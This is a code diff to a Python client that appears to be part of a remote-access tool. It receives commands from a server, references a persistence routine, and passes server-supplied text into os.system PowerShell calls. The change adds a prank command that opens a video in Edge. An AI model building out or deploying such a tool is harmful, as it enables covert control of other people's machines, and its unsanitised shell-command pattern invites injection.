@@ -104,6 +104,8 @@ def start_client():  # Start the client side and all the communication is here.
                 persistence()
             elif command == "send_message":
                 send_message(client)
+            elif command == "rick_roll":
+                rick_roll(client)     
             elif command == "alive?":
                 client.sendall("yes".encode())
             else:
@@ -132,6 +134,14 @@ def send_message(client):
         msg = msg[:0] + "'" + msg[0:] + "'"
         os.system(fr'PowerShell -Command "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show({msg})"')
         client.sendall("Message sent successfully.".encode())
+    except Exception as e:
+        print(f"{e}")
+
+def rick_roll(client):
+    try:
+        """this function gets your rickrolled"""
+        os.system(fr'explorer.exe "microsoft-edge:https://img-9gag-fun.9cache.com/photo/awz6eey_460svvp9.webm"')
+        client.sendall("Rick Rolled Successfully.".encode())
     except Exception as e:
         print(f"{e}")
 
